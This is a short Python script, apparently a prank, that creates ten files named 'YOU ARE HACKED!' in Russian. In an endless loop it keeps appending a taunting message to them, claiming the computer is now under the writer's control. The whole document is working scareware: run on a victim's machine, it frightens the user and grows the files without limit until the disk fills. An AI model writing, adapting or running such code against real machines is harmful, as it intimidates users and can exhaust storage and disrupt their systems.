a=['ВАС ВЗЛОМАН!.txt','ВАС ВЗЛОМАН2!.txt','ВАС ВЗЛОМАН3!.txt','ВАС ВЗЛОМАН4!.txt','ВАС ВЗЛОМАН5!.txt'
   ,'ВАС ВЗЛОМАН6!.txt','ВАС ВЗЛОМАН7!.txt','ВАС ВЗЛОМАН8!.txt','ВАС ВЗЛОМАН9!.txt','ВАС ВЗЛОМАН10!.txt',]

def hacked():
  for i in a:
    f=open(i,'a')
    str='Nothing can save you here, friend – you’re in my world now.\n Your computer now is mine, Why? Because I didn’t had nothing to do and I thought, why not make the evil? Remember NOW YOUR PC IS IN MY POWER \n'
    f.write(str)
    f.close()


while True:
    hacked()
   


#exec(open('prac.py').read())
